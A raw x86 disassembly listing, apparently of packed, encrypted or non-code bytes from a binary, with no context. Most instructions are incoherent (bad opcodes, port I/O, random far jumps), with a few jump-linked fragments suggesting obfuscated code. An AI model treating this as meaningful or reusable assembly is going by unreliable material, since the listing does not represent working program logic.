  408933:	dec    eax
  408934:	pusha  
  408935:	cwde   
  408936:	pop    edx
  408937:	aas    
  408938:	imul   esp,DWORD PTR [edi],0xb0870bb8
  40893e:	mov    ah,0xe0
  408940:	outs   dx,BYTE PTR ds:[esi]
  408941:	push   ebx
  408942:	scas   eax,DWORD PTR es:[edi]
  408943:	mov    ecx,0xc20eddb9
  408948:	and    al,0xdf
  40894a:	retf   
  40894b:	inc    edi
  40894c:	retf   0xad63
  40894f:	mov    ebx,0x6ed10f54
  408954:	daa    
  408955:	scas   al,BYTE PTR es:[edi]
  408956:	xlat   BYTE PTR ds:[ebx]
  408957:	xchg   ebx,eax
  408958:	jns    0x408982
  40895a:	loopne 0x408938
  40895c:	pop    ds
  40895d:	jbe    0x408993
  40895f:	clc    
  408960:	dec    edi
  408961:	sbb    esi,DWORD PTR [edi]
  408963:	inc    edi
  408964:	data16 jge 0x40895e
  408967:	sahf   
  408968:	adc    BYTE PTR [edi-0x5e],0x5c
  40896c:	ror    DWORD PTR [edx],1
  40896e:	popf   
  40896f:	jmp    0x5639:0x8a90083c
  408976:	jge    0x4089aa
  408978:	fs adc eax,0x55ea3f1f
  40897e:	xchg   ebx,eax
  40897f:	jno    0x4089e9
  408981:	xchg   ebx,esi
  408983:	fisubr WORD PTR [ecx-0x44b158b0]
  408989:	pop    es
  40898a:	mov    ebp,0xe44eb0c2
  40898f:	xor    BYTE PTR [ecx-0x8f91275],bh
  408995:	popa   
  408996:	stos   BYTE PTR es:[edi],al
  408997:	fsub   st(2),st
  408999:	mov    cl,BYTE PTR [edi]
  40899b:	fs mov cl,0xf4
  40899e:	and    eax,0x3cbf88c1
  4089a3:	fidiv  DWORD PTR [ecx]
  4089a5:	mov    ebp,0xfdaf0d92
  4089aa:	cld    
  4089ab:	mov    ds:0x837bcaa8,eax
  4089b0:	mov    bh,0xa0
  4089b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089b3:	mov    eax,ds:0x1b0856c9
  4089b8:	xchg   ebx,eax
  4089b9:	sbb    eax,0x12d22b42
  4089be:	repnz int 0x66
  4089c1:	(bad)  
  4089c2:	loop   0x408a39
  4089c4:	call   0xa084235e
  4089c9:	pop    es
  4089ca:	not    DWORD PTR [ebp+0x127c9288]
  4089d0:	mov    ebx,DWORD PTR [ebp+0x14175bf2]
  4089d6:	push   edi
  4089d7:	add    cl,BYTE PTR [ebx]
  4089d9:	adc    esp,DWORD PTR [eax]
  4089db:	push   ebp
  4089dc:	fimul  WORD PTR [eax]
  4089de:	les    ebx,FWORD PTR [esi]
  4089e0:	sbb    al,0xe1
  4089e2:	mov    edi,0x8eb16e14
  4089e7:	(bad)  
  4089e9:	stos   DWORD PTR es:[edi],eax
  4089ea:	stc    
  4089eb:	shl    bh,1
  4089ed:	push   edx
  4089ee:	mov    al,0xbc
  4089f0:	mov    al,ds:0x782f4d6c
  4089f5:	mov    ch,0x44
  4089f7:	mov    bl,0x9d
  4089f9:	adc    ecx,esi
  4089fb:	loop   0x408a22
  4089fd:	out    dx,al
  4089fe:	in     al,dx
  4089ff:	inc    esp
  408a00:	mov    ch,0x3e
  408a02:	cwde   
  408a03:	out    dx,al
  408a04:	dec    esi
  408a05:	in     al,0xc2
  408a07:	nop
  408a08:	loopne 0x408a75
  408a0a:	mov    esp,0x7528586
  408a0f:	aad    0x40
  408a11:	pop    es
  408a12:	adc    DWORD PTR [eax-0x3e],edx
  408a15:	adc    edi,DWORD PTR [esp+esi*8]
  408a18:	xchg   ecx,eax
  408a19:	test   DWORD PTR [ecx-0x5881ae95],eax
  408a1f:	cmc    
  408a20:	pop    ebx
  408a21:	out    dx,eax
  408a22:	pop    edx
  408a23:	inc    ebp
  408a24:	mov    bh,0x62
  408a26:	outs   dx,BYTE PTR ds:[esi]
  408a27:	enter  0xce79,0x2b
  408a2b:	and    al,0xc6
  408a2d:	pop    esi
  408a2e:	rcr    BYTE PTR [edx-0x23b2816f],cl
  408a34:	xchg   ecx,eax
  408a35:	icebp  
  408a36:	in     al,dx
  408a37:	xor    bh,BYTE PTR [edx]
  408a39:	pop    ecx
  408a3a:	pop    ds
  408a3b:	mov    edx,0xcc659fac
  408a40:	dec    edi
  408a41:	or     eax,0x1f14b79
  408a46:	inc    ecx
  408a47:	in     al,0x2e
  408a49:	jle    0x408a50
  408a4b:	fnstenvw [ebx]
  408a4e:	adc    BYTE PTR [ebp-0x4e],al
  408a51:	add    al,0xfd
  408a53:	inc    esp
  408a54:	dec    di
  408a56:	mov    esp,0xd0f43f02
  408a5b:	dec    edx
  408a5c:	push   0xffffffeb
  408a5e:	push   ebp
  408a5f:	call   0xf8fa:0x4f15313
  408a66:	lock or BYTE PTR [edx-0x36],cl
  408a6a:	arpl   WORD PTR [esi-0x6e],sp
  408a6d:	mov    dl,0x16
  408a6f:	mov    WORD PTR [esi+ecx*2+0x688198b2],?
  408a76:	or     al,BYTE PTR [edx+0x5133d997]
  408a7c:	repnz aaa 
  408a7e:	fwait
  408a7f:	sar    BYTE PTR [ecx],cl
  408a81:	mov    BYTE PTR [ecx+0x5d],al
  408a84:	mov    ss:0xe67736c2,al
  408a8a:	mov    esp,0x3807ea6e
  408a8f:	adc    dl,BYTE PTR [edx+edx*4]
  408a92:	mov    esi,0xcde222cf
  408a97:	push   edx
  408a98:	adc    al,0x85
  408a9a:	gs hlt 
  408a9c:	icebp  
  408a9d:	sbb    eax,0x32e5c9ca
  408aa2:	sub    DWORD PTR [ecx+eax*1-0x56],esp
  408aa6:	push   cs
  408aa7:	aaa    
  408aa8:	xlat   BYTE PTR ds:[ebx]
  408aa9:	scas   al,BYTE PTR es:[edi]
  408aaa:	sahf   
  408aab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408aac:	push   ss
  408aad:	rcl    eax,1
  408aaf:	cld    
  408ab0:	bound  ecx,QWORD PTR [ecx]
  408ab2:	adc    cl,BYTE PTR [eax+0x73]
  408ab5:	scas   eax,DWORD PTR es:[edi]
  408ab6:	sub    eax,0x738d1bc3
  408abb:	mov    esi,DWORD PTR [esi]
  408abd:	paddsb mm5,QWORD PTR [eax-0x25]
  408ac1:	jp     0x408b1b
  408ac3:	sbb    edx,DWORD PTR [eax+0x679b10d8]
  408ac9:	aad    0x6c
  408acb:	add    eax,0x69229626
  408ad0:	mov    eax,DWORD PTR [ecx-0x65]
  408ad3:	(bad)  
  408ad4:	push   0xffffff9f
  408ad6:	mov    edx,edx
  408ad8:	push   0xd391d969
  408add:	aaa    
  408ade:	cmp    DWORD PTR [edi+0x540736fd],esi
  408ae4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ae5:	loop   0x408ad8
  408ae7:	mov    bh,BYTE PTR [ecx-0x74]
  408aea:	mov    WORD PTR [eax],?
  408aec:	xchg   ebx,eax
  408aed:	sbb    cl,0xed
  408af0:	push   ebx
  408af1:	ja     0x408af6
  408af3:	std    
  408af4:	adc    al,BYTE PTR [esi]
  408af6:	inc    ecx
  408af7:	cmc    
  408af8:	aam    0x60
  408afa:	jns    0x408abb
  408afc:	sbb    BYTE PTR [ebx+eiz*4],dl
  408aff:	icebp  
  408b00:	push   0xffffffd2
  408b02:	jmp    0x408b4f
  408b04:	repnz (bad) 
  408b06:	shl    BYTE PTR [edi+0x79ab312e],1
  408b0c:	mov    esi,0x6650a6fd
  408b11:	stos   BYTE PTR es:[edi],al
  408b12:	stos   DWORD PTR es:[edi],eax
  408b13:	xchg   esp,eax
  408b14:	ds jo  0x408ab8
  408b17:	test   eax,0x840af561
  408b1c:	mov    dl,0x5e
  408b1e:	psrld  mm1,mm0
  408b21:	inc    DWORD PTR [ecx+0x345ee9dd]
  408b27:	les    eax,FWORD PTR [ecx]
  408b29:	sahf   
  408b2a:	add    eax,0x69ebbf99
  408b2f:	int3   
  408b30:	sub    esp,esp
  408b32:	test   al,0x21
  408b34:	xchg   edx,eax
  408b35:	je     0x408ace
  408b37:	cwde   
  408b38:	gs sub eax,0xdfe87dd4
  408b3e:	and    bl,cl
  408b40:	jbe    0x408b70
  408b42:	cld    
  408b43:	ins    DWORD PTR es:[edi],dx
  408b44:	mov    ds:0xfb06f2eb,eax
  408b49:	fadd   QWORD PTR [eax]
  408b4b:	pop    edx
  408b4c:	mov    ch,0xa0
  408b4e:	and    BYTE PTR [esi],ch
  408b50:	pop    esp
  408b51:	sahf   
  408b52:	ror    DWORD PTR [ebp-0x4b143bef],0xc2
  408b59:	shr    DWORD PTR [ecx],1
  408b5b:	dec    edx
  408b5c:	inc    ebp
  408b5d:	aam    0x33
  408b5f:	sub    BYTE PTR [edx],dl
  408b61:	ins    BYTE PTR es:[edi],dx
  408b62:	push   ebx
  408b63:	bound  esi,QWORD PTR [ebp-0x48]
  408b66:	push   ebp
  408b67:	sbb    eax,0x2aee9b2a
  408b6c:	push   0xd90ca926
  408b71:	sbb    edi,eax
  408b73:	cli    
  408b74:	retf   0x88b1
  408b77:	jo     0x408b1b
  408b79:	inc    ecx
  408b7a:	out    dx,eax
  408b7b:	xor    al,BYTE PTR [eax+0x340fce56]
  408b81:	repnz nop ebx
  408b85:	xchg   ecx,eax
  408b86:	es cmp al,0x4a
  408b89:	inc    esi
  408b8a:	mov    eax,ds:0x966ad38c
  408b8f:	in     al,0xb3
  408b91:	push   ebx
  408b92:	(bad)  
  408b93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b94:	xor    eax,0x1fb48fbe
  408b99:	or     BYTE PTR [eax],0x93
  408b9c:	xchg   BYTE PTR [ecx-0x3ee00c72],bl
  408ba2:	or     ah,dl
  408ba4:	scas   al,BYTE PTR es:[edi]
  408ba5:	add    al,0x2a
  408ba7:	jecxz  0x408b3a
  408ba9:	xor    eax,0x268f3512
  408bae:	icebp  
  408baf:	test   DWORD PTR [edx],esp
  408bb1:	inc    edx
  408bb2:	ret    
  408bb3:	pop    edi
  408bb4:	jb     0x408c13
  408bb6:	inc    ecx
  408bb7:	xlat   BYTE PTR ds:[ebx]
  408bb8:	pop    ebx
  408bb9:	or     edx,0x3d
  408bbc:	ss aam 0x34
  408bbf:	outs   dx,BYTE PTR ds:[esi]
  408bc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bc1:	js     0x408b5b
  408bc3:	lds    ebx,FWORD PTR [eax+0x6a]
  408bc6:	xor    eax,0xb598ae43
  408bcb:	mov    DWORD PTR [ebp+esi*8-0x12],eax
  408bcf:	and    DWORD PTR [ebp-0x3b],esi
  408bd2:	jle    0x408b75
  408bd4:	inc    ebp
  408bd5:	push   edx
  408bd6:	call   0x3286:0xc9881c6f
  408bdd:	not    esi
  408bdf:	jns    0x408bec
  408be1:	ret    
  408be2:	push   cs
  408be3:	mov    bl,0xb7
  408be5:	lahf   
  408be6:	mov    ds:0x533be491,eax
  408beb:	push   ds
  408bec:	cmc    
  408bed:	jecxz  0x408be6
  408bef:	jle    0x408be3
  408bf1:	mov    eax,ds:0x148b6134
  408bf6:	adc    ch,BYTE PTR [edx+ebp*4]
  408bf9:	xchg   esi,eax
  408bfa:	fst    QWORD PTR [edi]
  408bfc:	push   cs
  408bfd:	cld    
  408bfe:	scas   al,BYTE PTR es:[edi]
  408bff:	test   DWORD PTR [edx-0x7f62ccd5],ebx
  408c05:	jbe    0x408b94
  408c07:	fild   DWORD PTR [edi+ebx*8]
  408c0a:	mov    WORD PTR [edi-0x3d6a0f8c],cs
  408c10:	mov    esi,0x77f05a36
  408c15:	push   ss
  408c16:	rol    DWORD PTR [eax-0x6a],0xe3
  408c1a:	or     ah,BYTE PTR [edx+edi*4]
  408c1d:	je     0x408c0e
  408c1f:	fwait
  408c20:	sbb    cl,BYTE PTR [eax]
  408c22:	outs   dx,DWORD PTR ds:[esi]
  408c23:	pop    es
  408c24:	out    dx,al
  408c25:	das    
  408c26:	pop    edi
  408c27:	(bad)  [eax-0x22]
  408c2a:	lea    edi,[esi-0x1]
  408c2d:	rol    ebx,0x2e
  408c30:	mov    bh,0xa
  408c32:	in     eax,dx
  408c33:	adc    esi,DWORD PTR [edi-0x27b77fb7]
  408c39:	test   eax,0xb9f5b6ea
  408c3e:	mov    edx,0x53f33b31
  408c43:	leave  
  408c44:	aam    0x7a
  408c46:	arpl   WORD PTR [ecx+0x49],bx
  408c49:	xchg   ecx,edx
  408c4b:	dec    BYTE PTR [edx]
  408c4d:	push   DWORD PTR [ebp-0x10]
  408c50:	mov    eax,ds:0x41b264
  408c55:	mov    eax,DWORD PTR [eax]
  408c57:	push   DWORD PTR [eax]
  408c59:	lea    eax,ds:0x41b280
  408c5f:	jmp    0x408fac
  408c64:	mov    ebx,0x93838448
  408c69:	push   ebx
  408c6a:	mov    ebx,0x78da0248
  408c6f:	bound  ecx,QWORD PTR [edx+0x47f0680d]
  408c75:	fnstenv [eax+0x70]
  408c78:	and    BYTE PTR [ebp+0x70],bh
  408c7b:	jo     0x408c85
  408c7d:	jnp    0x408c12
  408c7f:	(bad)  
  408c80:	test   DWORD PTR [ecx+0x7fb53305],edi
  408c86:	inc    ebx
  408c87:	jge    0x408ca3
  408c89:	pusha  
  408c8a:	gs je  0x408c2d
  408c8d:	jp     0x408cf4
  408c8f:	jmp    0xa19e:0xac3c63aa
  408c96:	repz jnp 0x408c77
  408c99:	inc    esp
  408c9a:	push   0xffffffdb
  408c9c:	sub    DWORD PTR [edi-0x19],ebp
  408c9f:	mov    esp,0x5eadb323
  408ca4:	and    eax,0x2f39fa2e
  408ca9:	mov    edi,0x317f1c7d
  408cae:	jmp    0x77fc30d0
  408cb3:	out    dx,eax
  408cb4:	sub    eax,0x9460f3d7
  408cb9:	pop    edx
  408cba:	ins    DWORD PTR es:[edi],dx
  408cbb:	cs dec eax
  408cbd:	mov    ?,WORD PTR [esi+0x16]
  408cc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cc1:	or     ah,ah
  408cc3:	add    al,0x28
  408cc5:	mov    esp,0x882eec3b
  408cca:	jno    0x408cf3
  408ccc:	pop    esp
  408ccd:	out    dx,eax
  408cce:	push   0x1148bc6c
  408cd3:	jo     0x408ccf
  408cd5:	or     al,0x4c
  408cd7:	out    0xc,eax
  408cd9:	repz popa 
  408cdb:	ret    
  408cdc:	pop    edx
  408cdd:	nop
  408cde:	scas   eax,DWORD PTR es:[edi]
  408cdf:	mov    al,0xc
  408ce1:	adc    al,0x91
  408ce3:	retf   
  408ce4:	shr    al,0xfc
  408ce7:	inc    ebx
  408ce8:	pusha  
  408ce9:	fwait
  408cea:	ja     0x408d02
  408cec:	mov    gs,WORD PTR [esi+0x65]
  408cef:	stos   DWORD PTR es:[edi],eax
  408cf0:	push   0xffffffd7
  408cf2:	mov    ebx,0x923cc34b
  408cf7:	mov    DWORD PTR [ecx-0x3a],eax
  408cfa:	adc    eax,0x62426a0f
  408cff:	ret    0x9de4
  408d02:	push   ebx
  408d03:	push   edx
  408d04:	idiv   BYTE PTR [edx]
  408d06:	jle    0x408cf8
  408d08:	test   eax,0x466aed5e
  408d0d:	or     al,cl
  408d0f:	push   eax
  408d10:	add    BYTE PTR [edx-0x33],ah
  408d13:	neg    BYTE PTR [eax+0x53]
  408d16:	inc    ebx
  408d17:	jnp    0x408cd5
  408d19:	pusha  
  408d1a:	xchg   ecx,eax
  408d1b:	push   0xffffffab
  408d1d:	add    cl,bl
  408d1f:	lock dec eax
  408d21:	scas   al,BYTE PTR es:[edi]
  408d22:	pop    ds
  408d23:	fsubrp st(0),st
  408d25:	add    eax,0x685ce52e
  408d2a:	mov    ah,ch
  408d2c:	adc    esi,DWORD PTR [ecx-0x278efb3c]
  408d32:	enter  0x1865,0x3f
  408d36:	pop    edx
  408d37:	scas   al,BYTE PTR es:[edi]
  408d38:	xchg   BYTE PTR [ebx],bh
  408d3a:	adc    eax,0xbfd127ea
  408d3f:	shl    BYTE PTR [ecx],cl
  408d41:	add    dl,BYTE PTR [ebp-0x22c82358]
  408d47:	xchg   esi,eax
  408d48:	das    
  408d49:	pop    ebx
  408d4a:	in     eax,0x91
  408d4c:	push   ebx
  408d4d:	lea    ecx,[ecx]
  408d4f:	test   eax,0x6d093991
  408d54:	or     ecx,DWORD PTR [eax]
  408d56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d57:	scas   eax,DWORD PTR es:[edi]
  408d58:	fidiv  WORD PTR [ecx]
  408d5a:	cmp    eax,DWORD PTR [ecx]
  408d5c:	je     0x408cf7
  408d5e:	out    0x32,al
  408d60:	(bad)  
  408d61:	lods   eax,DWORD PTR ds:[esi]
  408d62:	stc    
  408d63:	clc    
  408d64:	push   edx
  408d65:	jmp    DWORD PTR [edi]
  408d67:	mov    dl,0xf1
  408d69:	push   esi
  408d6a:	sbb    al,0xf2
  408d6c:	aaa    
  408d6d:	adc    DWORD PTR [edx],eax
  408d6f:	xchg   esi,eax
  408d70:	scas   eax,DWORD PTR es:[edi]
  408d71:	dec    eax
  408d72:	or     esi,DWORD PTR [esi-0x30]
  408d75:	or     esp,edx
  408d77:	mov    ah,dl
  408d79:	or     al,0x8b
  408d7b:	add    BYTE PTR [eax],ah
  408d7d:	adc    edi,esp
  408d7f:	push   ds
  408d80:	repnz cdq 
  408d82:	ret    
  408d83:	stc    
  408d84:	arpl   WORD PTR [ebp+ebp*1+0x62b32e58],di
  408d8b:	fcmovnb st,st(4)
  408d8d:	ret    
  408d8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d8f:	out    0x18,eax
  408d91:	sub    eax,0x55463564
  408d96:	jno    0x408dd8
  408d98:	(bad)  [esi+0x3c]
  408d9b:	jnp    0x408d7b
  408d9d:	inc    esi
  408d9e:	mov    cl,0x89
  408da0:	sbb    eax,0xbcfabe16
  408da5:	jmp    0x408df4
  408da7:	dec    eax
  408da8:	mov    cl,0x7e
  408daa:	cmp    bl,BYTE PTR [eax-0x5f48e8b8]
  408db0:	pop    es
  408db1:	sbb    cl,BYTE PTR [edx+0x51]
  408db4:	int3   
  408db5:	aas    
  408db6:	mov    eax,ds:0x96640747
  408dbb:	adc    eax,DWORD PTR [eax]
  408dbd:	pop    eax
  408dbe:	mov    ebx,0x73afd6aa
  408dc3:	hlt    
  408dc4:	cmp    al,0x92
  408dc6:	data16 arpl WORD PTR [ebx+ecx*1],bp
  408dca:	fild   DWORD PTR [edi-0x15]
  408dcd:	xor    DWORD PTR [ebp+0x4f],ebp
  408dd0:	dec    edi
  408dd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408dd2:	sub    eax,0x97ceaa37
  408dd7:	aaa    
  408dd8:	jp     0x408e10
  408dda:	sbb    ecx,ecx
  408ddc:	or     DWORD PTR [ebx-0x14c04957],edi
  408de2:	call   0x5edbf883
  408de7:	ror    DWORD PTR [ecx+0x2d36a9e2],0x7f
  408dee:	sahf   
  408def:	cs shr esp,cl
  408df2:	pop    ecx
  408df3:	pop    ds
  408df4:	xor    dh,BYTE PTR [ecx]
  408df6:	outs   dx,DWORD PTR ds:[esi]
  408df7:	mov    ds:0x36169901,al
  408dfc:	xchg   edi,eax
  408dfd:	outs   dx,DWORD PTR ds:[esi]
  408dfe:	xchg   bx,ax
  408e00:	sub    esi,DWORD PTR [ecx]
  408e02:	jmp    0x408db2
  408e04:	mov    ebp,0x8daf46fe
  408e09:	fst    QWORD PTR [esp+eiz*2]
  408e0c:	sar    DWORD PTR [eax-0x29285f11],1
  408e12:	fincstp 
  408e14:	adc    BYTE PTR [edi-0x4d6c571d],bl
  408e1a:	rol    DWORD PTR [edi],0x9d
  408e1d:	adc    BYTE PTR [esi],0x69
  408e20:	jo     0x408e20
  408e22:	sahf   
  408e23:	mov    ch,0xa1
  408e25:	fistp  WORD PTR [ebx+ebp*8]
  408e28:	sub    bh,ch
  408e2a:	jne    0x408e70
  408e2c:	loope  0x408db9
  408e2e:	sbb    eax,0x1788171f
  408e33:	dec    edi
  408e34:	enter  0x646a,0xbc
  408e38:	add    DWORD PTR [esi+0x427bee67],ebp
  408e3e:	mov    DWORD PTR [edx],edx
  408e40:	add    eax,0xb3e31aa2
  408e45:	pop    edx
  408e46:	xor    al,0x9d
  408e48:	add    BYTE PTR ds:0x6c103cd9,bl
  408e4e:	ficomp WORD PTR [ecx-0x28737e76]
  408e54:	(bad)  
  408e55:	int3   
  408e56:	pusha  
  408e57:	test   DWORD PTR [edi+0x62],esp
  408e5a:	pop    ebx
  408e5b:	call   0xa453:0x4c754608
  408e62:	out    0x9f,eax
  408e64:	mov    ch,ah
  408e66:	cmp    eax,0xaf8c96a7
  408e6b:	ret    0xd1dc
  408e6e:	sub    BYTE PTR [ecx-0x3d453ca2],ah
  408e74:	cmp    ebp,ebx
  408e76:	xor    esp,DWORD PTR [eax+0x5125996]
  408e7c:	test   bl,bl
  408e7e:	cs push ebx
  408e80:	adc    esp,DWORD PTR [edi]
  408e82:	push   ds
  408e83:	jo     0x408e7c
  408e85:	ins    BYTE PTR es:[edi],dx
  408e86:	or     al,0xc1
  408e88:	xchg   ebx,eax
  408e89:	je     0x408e39
  408e8b:	jl     0x408f0b
  408e8d:	or     dh,BYTE PTR [edx-0x711795e8]
  408e93:	loopne 0x408e84
  408e95:	mov    ds:0x6436914e,eax
  408e9a:	fimul  DWORD PTR [ecx+0x4e]
  408e9d:	idiv   BYTE PTR [edx]
  408e9f:	(bad)  
  408ea0:	hlt    
  408ea1:	adc    eax,0xa61f0eca
  408ea6:	enter  0x824c,0xf6
  408eaa:	cmp    DWORD PTR [esi+0x69aee9a1],ebp
  408eb0:	repz xchg edx,eax
  408eb2:	test   BYTE PTR [eax-0x2a],bl
  408eb5:	mov    dh,0x9f
  408eb7:	mov    esi,0x7da113d
  408ebc:	xchg   esi,eax
  408ebd:	iret   
  408ebe:	in     eax,dx
  408ebf:	inc    ebp
  408ec0:	shl    DWORD PTR [ebx+eax*4+0x1047ad2],cl
  408ec7:	dec    esi
  408ec8:	out    0xe8,al
  408eca:	sar    edi,0x31
  408ecd:	sub    eax,0xa4f7b122
  408ed2:	jmp    ecx
  408ed4:	cmp    BYTE PTR [edi+0x5deb2a3d],al
  408eda:	outs   dx,DWORD PTR ds:[esi]
  408edb:	std    
  408edc:	in     al,dx
  408edd:	sti    
  408ede:	cmp    BYTE PTR [edi+esi*8+0x1b02c1ec],bl
  408ee5:	cli    
  408ee6:	lods   al,BYTE PTR ds:[esi]
  408ee7:	fadd   st,st(2)
  408ee9:	jno    0x408e8d
  408eeb:	fld    QWORD PTR [edi]
  408eed:	push   edi
  408eee:	enter  0xee66,0x56
  408ef2:	int    0xfa
  408ef4:	and    DWORD PTR [ecx],ebp
  408ef6:	pop    eax
  408ef7:	pop    ebp
  408ef8:	inc    ebp
  408ef9:	out    0x41,eax
  408efb:	cs push ds
  408efd:	cwde   
  408efe:	and    al,BYTE PTR [ebp-0x3dcee234]
  408f04:	and    eax,edx
  408f06:	pop    ebp
  408f07:	bound  ecx,QWORD PTR [ecx+0x7299d10]
  408f0d:	sbb    DWORD PTR [ecx+0x71],esi
  408f10:	jne    0x408f6d
  408f12:	data16 jg 0x408f4f
  408f15:	scas   al,BYTE PTR es:[edi]
  408f16:	shr    ah,cl
  408f18:	js     0x408eea
  408f1a:	dec    ebp
  408f1b:	adc    eax,0xfa7e4754
  408f20:	mov    dl,0x47
  408f22:	inc    ebx
  408f23:	xor    eax,edx
  408f25:	or     DWORD PTR [edi+0x67],eax
  408f28:	jnp    0x408ec0
  408f2a:	(bad)  
  408f2b:	shl    BYTE PTR [ebx],1
  408f2d:	outs   dx,BYTE PTR ds:[esi]
  408f2e:	mov    al,ds:0x83b251dd
  408f33:	pusha  
  408f34:	dec    edx
  408f35:	fs mov edx,0xdf478f55
  408f3b:	shl    DWORD PTR [esi+esi*4-0x4fa977f9],1
  408f42:	aam    0xdc
  408f44:	xchg   DWORD PTR [edi+eiz*8],ebx
  408f47:	(bad)  [eax-0x3c]
  408f4a:	cmp    DWORD PTR [edi],ebp
  408f4c:	add    BYTE PTR [ecx+0x1f1d322],ah
  408f52:	mov    dl,0x2c
  408f54:	retf   
  408f55:	pop    edi
  408f56:	add    esp,ebx
  408f58:	mov    DWORD PTR [esi-0xe],edi
  408f5b:	clc    
  408f5c:	lods   al,BYTE PTR ds:[esi]
  408f5d:	das    
  408f5e:	add    ebx,DWORD PTR [edi-0x7e]
  408f61:	gs (bad) 
  408f63:	push   eax
  408f64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f65:	pop    ecx
  408f66:	mov    al,0x66
  408f68:	xchg   BYTE PTR [ebp+0x51],dh
  408f6b:	std    
  408f6c:	inc    ebp
  408f6d:	mov    esp,DWORD PTR [ecx]
  408f6f:	pop    esp
  408f70:	xchg   ecx,eax
  408f71:	jl     0x408eff
  408f73:	lods   eax,DWORD PTR ds:[esi]
  408f74:	sub    esp,ecx
  408f76:	sub    eax,0x6d99eaa3
  408f7b:	scas   eax,DWORD PTR es:[edi]
  408f7c:	out    dx,al
  408f7d:	pop    ebp
  408f7e:	push   ebp
  408f7f:	add    DWORD PTR [ebp-0x16],ecx
  408f82:	lds    ebx,FWORD PTR [ebp+0x1d]
  408f85:	dec    ebx
  408f86:	dec    ebx
  408f88:	push   ecx
  408f89:	jne    0x408fa7
  408f8b:	fldenv [edi+0x5fda5a66]
  408f91:	jbe    0x408f21
  408f93:	adc    BYTE PTR [ebx],0x52
  408f96:	fwait
  408f97:	pop    ebp
  408f98:	(bad)  
  408f99:	ja     0x408fbe
  408f9b:	sbb    DWORD PTR [edi],edx
  408f9d:	lds    ebx,FWORD PTR [eax-0xcbded7b]
  408fa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fa4:	mov    DWORD PTR [ecx-0x39],edi
  408fa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fa8:	aam    0xab
  408faa:	xchg   ax,ax
  408fac:	push   DWORD PTR [eax]
  408fae:	lea    eax,ds:0x41b02c
  408fb4:	jmp    0x409301
  408fb9:	add    al,0x7c
  408fbb:	out    0xcb,eax
  408fbd:	out    0xf3,eax
  408fbf:	xor    al,0xd3
  408fc1:	call   0xd01937f3
  408fc6:	in     eax,dx
  408fc7:	ret    
  408fc8:	pop    edx
  408fc9:	ja     0x408fb1
  408fcb:	jo     0x40903d
  408fcd:	and    BYTE PTR [ebp+0x70],bh
  408fd0:	jo     0x409015
  408fd2:	(bad)  
  408fd3:	ss and eax,0xa5a8007f
  408fd9:	push   ecx
  408fda:	push   es
  408fdb:	retf   0xbaaa
  408fde:	add    bl,BYTE PTR [edi+ebx*8-0x79]
  408fe2:	mov    BYTE PTR [esi],bh
  408fe4:	es cmp cl,dh
  408fe7:	loop   0x408fae
  408fe9:	cmp    BYTE PTR [esi],dl
  408feb:	xchg   ebx,eax
  408fec:	push   edx
  408fed:	outs   dx,DWORD PTR ds:[esi]
  408fee:	xlat   BYTE PTR ds:[ebx]
  408fef:	call   0xc65:0x2f2fbe9
  408ff6:	xlat   BYTE PTR ds:[ebx]
  408ff7:	pop    edx
  408ff8:	call   0x2a474c3
  408ffd:	ds xor al,0x4c
  409000:	call   FWORD PTR [esi+edi*1]
  409003:	int    0x87
  409005:	adc    ch,BYTE PTR [edx-0x10eff711]
  40900b:	pop    es
  40900c:	test   DWORD PTR [ecx+0x54],ebx
  40900f:	data16 fwait
  409011:	sbb    ebx,DWORD PTR [ecx+0x6898b760]
  409017:	cmc    
  409018:	cmp    eax,0xff8b39f1
  40901d:	push   ebp
  40901e:	sahf   
  40901f:	(bad)  [eax+edi*2+0x73]
  409023:	dec    ecx
  409024:	icebp  
  409025:	int    0xe2
  409027:	push   edx
  409028:	inc    eax
  409029:	sub    BYTE PTR [edi+0x54a72969],0x6a
  409030:	inc    edi
  409031:	clc    
  409032:	or     cl,dh
  409034:	xor    bh,BYTE PTR [edx+eiz*4+0x33737de2]
  40903b:	pop    edi
  40903c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40903d:	jns    0x409034
  40903f:	arpl   WORD PTR [ebp+eiz*4-0x45],ax
  409043:	ds dec eax
  409045:	push   ss
  409046:	ins    DWORD PTR es:[edi],dx
  409047:	bnd jo 0x408ff0
  40904a:	loopne 0x40900b
  40904c:	mov    bl,BYTE PTR [edx+esi*4+0x4c]
  409050:	out    dx,eax
  409051:	xor    DWORD PTR [edi],esp
  409053:	out    0x89,al
  409055:	std    
  409056:	inc    esp
  409057:	sti    
  409058:	sub    DWORD PTR ds:0xe2d914b5,edi
  40905e:	push   cs
  40905f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409060:	test   eax,0x898b92ee
  409065:	sub    ebx,DWORD PTR ds:0xfab1a45c
  40906b:	popa   
  40906c:	into   
  40906d:	cmp    eax,0xebd32273
  409072:	mov    DWORD PTR [eax-0x39dd900a],ebp
  409078:	lods   al,BYTE PTR ds:[esi]
  409079:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40907a:	in     eax,0xca
  40907c:	pop    ds
  40907d:	imul   esi,DWORD PTR [esi-0x2d0a8c71],0x2cbdd948
  409087:	add    al,0x38
  409089:	lea    edx,[ecx+0x40]
  40908c:	sbb    BYTE PTR [ebx-0x2d],dh
  40908f:	dec    esp
  409090:	cdq    
  409091:	test   eax,0xe6b406da
  409096:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409097:	push   edx
  409098:	jle    0x409102
  40909a:	add    BYTE PTR [ecx+0x29b7c83c],dl
  4090a0:	pusha  
  4090a1:	shl    BYTE PTR [eax],0x7c
  4090a4:	mov    dh,0xaf
  4090a6:	les    ecx,FWORD PTR [ebx-0x7d]
  4090a9:	shl    ecx,cl
  4090ab:	out    0x17,eax
